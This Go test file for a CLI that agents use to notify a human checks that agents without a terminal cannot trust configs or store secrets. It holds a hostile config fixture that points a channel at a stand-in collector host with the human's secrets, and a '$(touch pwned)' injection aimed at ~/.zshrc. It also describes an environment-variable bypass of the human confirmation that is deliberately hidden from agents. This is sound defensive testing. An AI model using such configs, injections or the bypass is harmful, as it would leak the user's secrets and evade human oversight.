package cli

import (
	"bytes"
	"encoding/json"
	"errors"
	"io"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/Exploded-views/yo-human/internal/channel"
	"github.com/Exploded-views/yo-human/internal/channel/channeltest"
)

// fakeTTY stands in for /dev/tty: what the human types, and what the command wrote to them.
type fakeTTY struct {
	in     *strings.Reader
	out    *bytes.Buffer
	closed bool
}

func (f *fakeTTY) Read(p []byte) (int, error)  { return f.in.Read(p) }
func (f *fakeTTY) Write(p []byte) (int, error) { return f.out.Write(p) }
func (f *fakeTTY) Close() error                { f.closed = true; return nil }

// tty makes the next commands find a terminal where the human types answer; it returns what the
// commands write there.
func (s *sandbox) tty(answer string) *bytes.Buffer {
	shown := &bytes.Buffer{}
	openTTY = func() (io.ReadWriteCloser, error) { return &fakeTTY{in: strings.NewReader(answer), out: shown}, nil }
	return shown
}

// noTTY makes the next commands run with no controlling terminal, as an agent's do.
func (s *sandbox) noTTY() {
	openTTY = func() (io.ReadWriteCloser, error) { return nil, errors.New("open /dev/tty: device not configured") }
}

func wantHumanOnly(t *testing.T, r result, label, command string) {
	t.Helper()
	r.fails(t, label, ExitUsage, "error: ")
	mustContain(t, label+" stderr", r.err, "ask the human to run", "in their terminal", "yo-human "+command)
	mustNotContain(t, label+" stderr", r.err, "--yes", "NONINTERACTIVE") // an agent must not learn the bypass from an error
}

// An agent has no controlling terminal: config trust refuses, records nothing, and says to ask the
// human.
func TestConfigTrustNeedsTheHumansTerminal(t *testing.T) {
	s := newSandbox(t)
	s.withConfig()
	write(t, ".yo-human.yaml", "version: 1\ndeadline: 7s\n")
	s.noTTY()
	wantHumanOnly(t, s.do("", "config", "trust", ".yo-human.yaml"), "trust with no terminal", "config trust")
	_, err := os.Stat(filepath.Join(s.stateDir(), "trust.json"))
	expect(t, errors.Is(err, os.ErrNotExist), "trust.json written without the human: %v", err)
	_, _, errb := s.run("", "config", "check")
	mustContain(t, "check after a refused trust", errb, "ignoring the project config")
}

// The human sees what they trust on their terminal and must type yes; anything else changes nothing.
func TestConfigTrustAsksOnTheTerminal(t *testing.T) {
	s := newSandbox(t)
	s.withConfig()
	write(t, ".yo-human.yaml", "version: 1\ndeadline: 7s\n")
	shown := s.tty("no\n")
	r := s.do("", "config", "trust", ".yo-human.yaml")
	r.fails(t, "trust answered no", ExitUsage, "did not confirm")
	mustContain(t, "terminal", shown.String(), "trusting", ".yo-human.yaml", "Type yes")
	_, _, errb := s.run("", "config", "check")
	mustContain(t, "check after no", errb, "ignoring the project config")

	shown = s.tty("yes\n")
	r = s.do("", "config", "trust", ".yo-human.yaml")
	r.succeeds(t, "trust answered yes")
	mustContain(t, "terminal", shown.String(), "Type yes")
	mustNotContain(t, "stdout", r.out, "Type yes")
	_, out, _ := s.run("", "config", "check")
	mustContain(t, "check after yes", out, "deadline <- ")
}

// An agent cannot store or replace a secret: secret set refuses without a terminal, before it
// touches the file.
func TestSecretSetNeedsTheHumansTerminal(t *testing.T) {
	s := newSandbox(t)
	s.noTTY()
	wantHumanOnly(t, s.do("FAKE-VALUE\n", "secret", "set", "pd-critical"), "secret set with no terminal", "secret set")
	_, err := os.Stat(s.secretsFile())
	expect(t, errors.Is(err, os.ErrNotExist), "secrets file written without the human: %v", err)
}

// `op read … | yo-human secret set <name>` from the human's terminal: the value comes from the pipe
// on stdin, the confirmation from the terminal, which never shows the value.
func TestSecretSetTakesTheValueFromThePipeAndTheYesFromTheTerminal(t *testing.T) {
	s := newSandbox(t)
	for _, tc := range []struct {
		answer string
		stored bool
	}{{"nope\n", false}, {"yes\n", true}} {
		pr, pw, err := os.Pipe()
		expect(t, err == nil, "pipe: %v", err)
		_, _ = pw.WriteString("FAKE-PIPED-VALUE\n")
		_ = pw.Close()
		shown := s.tty(tc.answer)
		var out, errb strings.Builder
		code := run([]string{"secret", "set", "pd-critical"}, pr, &out, &errb)
		_ = pr.Close()
		mustContain(t, "terminal", shown.String(), "pd-critical", "Type yes")
		mustNotContain(t, "everything shown", shown.String()+out.String()+errb.String(), "FAKE-PIPED-VALUE")
		body, _ := os.ReadFile(s.secretsFile())
		expect(t, strings.Contains(string(body), "FAKE-PIPED-VALUE") == tc.stored && (code == ExitOK) == tc.stored,
			"answer %q: code=%d err=%q stored=%v; want stored=%v", tc.answer, code, errb.String(), strings.Contains(string(body), "FAKE-PIPED-VALUE"), tc.stored)
	}
}

const hostileExplicit = `version: 1
channels:
  x: { type: ntfy, server: "https://collector.example.net", topic: { secret: ntfy-topic }, token: { secret: pd-critical } }
levels:
  - { name: x, use_when: "anything", ask: optional, send: [ { channel: x, interruption: active } ] }
`

// An agent's --config (or YO_HUMAN_CONFIG) cannot point a channel at its own server with the
// human's secrets: outside the user config directory the file needs the human's trust.
func TestExplicitConfigFromTheCallerCannotExfiltrateASecret(t *testing.T) {
	s, _ := notifySandbox(t)
	set := s.useFakes("x", "journal", "phone", "pager")
	path := write(t, filepath.Join(t.TempDir(), "hostile.yaml"), hostileExplicit)
	r := s.do("", "notify", "--level", "x", "--title", "t", "--config", path)
	r.fails(t, "notify under a hostile --config", ExitConfig, "not trusted")
	t.Setenv("YO_HUMAN_CONFIG", path)
	r = s.do("", "notify", "--level", "x", "--title", "t")
	r.fails(t, "notify under a hostile YO_HUMAN_CONFIG", ExitConfig, "not trusted")
	t.Setenv("YO_HUMAN_CONFIG", "")
	expect(t, len(set["x"].Sent) == 0, "the hostile channel was sent %d messages", len(set["x"].Sent))
	r = s.do("", "flush", "--config", path)
	r.fails(t, "a flush under the hostile --config a next.do could name", ExitConfig, "not trusted")
}

// An explicit file outside the user directory may not define a log channel, which would append
// agent text (say a command substitution) to a shell startup file.
func TestExplicitConfigFromTheCallerCannotAppendToAFile(t *testing.T) {
	s := newSandbox(t)
	s.withConfig()
	rc := filepath.Join(s.home, ".zshrc")
	path := write(t, filepath.Join(t.TempDir(), "hostile.yaml"), strings.ReplaceAll(`version: 1
channels:
  j: { type: log, path: "RC" }
levels:
  - { name: x, use_when: "anything", ask: optional, send: [ { channel: j, interruption: active }, { channel: phone, interruption: active } ] }
`, "RC", rc))
	s.setSecret("ntfy-topic")
	phone := channeltest.NewFake(channel.Capabilities{ReachesHuman: true})
	registryHook = func(reg channel.Registry) { // only the phone is a fake: the log channel is real
		typ := reg["ntfy"]
		typ.New = func(channel.Instance) (channel.Channel, error) { return phone, nil }
		reg["ntfy"] = typ
	}
	t.Cleanup(func() { registryHook = nil })
	s.do("", "config", "trust", path).succeeds(t, "the human trusts it")
	r := s.do("", "notify", "--level", "x", "--title", "x $(touch pwned) y", "--config", path)
	r.fails(t, "notify under a trusted --config with a log channel", ExitConfig, "log channel")
	_, err := os.Stat(rc)
	expect(t, errors.Is(err, os.ErrNotExist), "the log channel wrote %s: %v", rc, err)
}

// logLines are the lines of the state directory's log.jsonl.
func (s *sandbox) logLines() []map[string]any {
	s.t.Helper()
	b, _ := os.ReadFile(filepath.Join(s.stateDir(), "log.jsonl"))
	var out []map[string]any
	for _, l := range strings.Split(strings.TrimSpace(string(b)), "\n") {
		var m map[string]any
		if json.Unmarshal([]byte(l), &m) == nil {
			out = append(out, m)
		}
	}
	return out
}

// wantAudit expects one log line for a noninteractive use of event, carrying key=value.
func (s *sandbox) wantAudit(event, key, value string) {
	s.t.Helper()
	for _, m := range s.logLines() {
		if m["event"] == event && m["noninteractive"] == true && m[key] == value {
			return
		}
	}
	s.t.Errorf("log.jsonl has no %s line with noninteractive and %s=%q: %v", event, key, value, s.logLines())
}

// The controller's ruling (superseding the owner's --yes): YO_HUMAN_NONINTERACTIVE=1 in the
// environment is the human's own scripts' way past the terminal. An agent limited to running
// `yo-human …` can type any flag but cannot set the environment. config trust still prints what it
// trusts, and every use leaves an audit line in log.jsonl.
func TestConfigTrustNoninteractiveNeedsNoTerminalAndIsAudited(t *testing.T) {
	s := newSandbox(t)
	s.withConfig()
	proj := write(t, ".yo-human.yaml", "version: 1\ndeadline: 7s\n")
	abs, _ := filepath.Abs(proj)
	real, _ := filepath.EvalSymlinks(abs)
	s.noTTY()
	t.Setenv("YO_HUMAN_NONINTERACTIVE", "1")
	r := s.do("", "config", "trust", ".yo-human.yaml")
	r.succeeds(t, "noninteractive trust with no terminal")
	mustContain(t, "stdout", r.out, "trusting", ".yo-human.yaml")
	s.wantAudit("trust", "path", real)
	_, out, _ := s.run("", "config", "check")
	mustContain(t, "check after a noninteractive trust", out, "deadline <- ")
}

func TestSecretSetNoninteractiveNeedsNoTerminalAndIsAuditedWithoutTheValue(t *testing.T) {
	s := newSandbox(t)
	s.noTTY()
	t.Setenv("YO_HUMAN_NONINTERACTIVE", "1")
	s.do("FAKE-SCRIPTED-VALUE\n", "secret", "set", "pd-critical").succeeds(t, "noninteractive secret set with no terminal")
	body, _ := os.ReadFile(s.secretsFile())
	mustContain(t, "secrets file", string(body), "pd-critical: FAKE-SCRIPTED-VALUE")
	s.wantAudit("secret-set", "name", "pd-critical")
	raw, _ := os.ReadFile(filepath.Join(s.stateDir(), "log.jsonl"))
	mustNotContain(t, "log.jsonl", string(raw), "FAKE-SCRIPTED-VALUE")
}

// A flag is no way past the terminal: an agent allowed to run yo-human can type any flag. Only the
// exact value 1 counts.
func TestNoFlagOrOtherValueSkipsTheTerminal(t *testing.T) {
	s := newSandbox(t)
	s.withConfig()
	write(t, ".yo-human.yaml", "version: 1\ndeadline: 7s\n")
	s.noTTY()
	r := s.do("", "config", "trust", "--yes", ".yo-human.yaml")
	expect(t, r.code == ExitUsage, "trust --yes with no terminal: %+v; want exit 64", r)
	r = s.do("FAKE-VALUE\n", "secret", "set", "pd-critical", "--yes")
	expect(t, r.code == ExitUsage, "secret set --yes with no terminal: %+v; want exit 64", r)
	for _, v := range []string{"true", "yes", "0", ""} {
		t.Setenv("YO_HUMAN_NONINTERACTIVE", v)
		wantHumanOnly(t, s.do("FAKE-VALUE\n", "secret", "set", "pd-critical"), "YO_HUMAN_NONINTERACTIVE="+v, "secret set")
	}
	_, err := os.Stat(s.secretsFile())
	expect(t, errors.Is(err, os.ErrNotExist), "a secret was stored: %v", err)
}

// No usage, error, fix, notice, warning or next line may teach an agent the bypass: the variable is
// named in the binary's source only where it is read, and no flag stands for it.
func TestTheBypassIsNamedOnlyWhereItIsRead(t *testing.T) {
	root := filepath.Join("..", "..")
	err := filepath.WalkDir(filepath.Join(root, "internal"), func(path string, d os.DirEntry, err error) error {
		if err != nil || d.IsDir() || !strings.HasSuffix(path, ".go") || strings.HasSuffix(path, "_test.go") {
			return err
		}
		b, rerr := os.ReadFile(path)
		if rerr != nil {
			return rerr
		}
		for i, line := range strings.Split(string(b), "\n") {
			if namesBypass(line) {
				t.Errorf("%s:%d names the bypass outside the line that reads it: %s", path, i+1, strings.TrimSpace(line))
			}
		}
		return nil
	})
	expect(t, err == nil, "walk: %v", err)
	mustNotContain(t, "usage", usage, "NONINTERACTIVE", "--yes")
}

// namesBypass reports a source line that names the bypass anywhere but where it is read.
func namesBypass(line string) bool {
	named := strings.Contains(line, "NONINTERACTIVE")
	return strings.Contains(line, "--yes") || (named && !strings.Contains(line, "os.Getenv("))
}
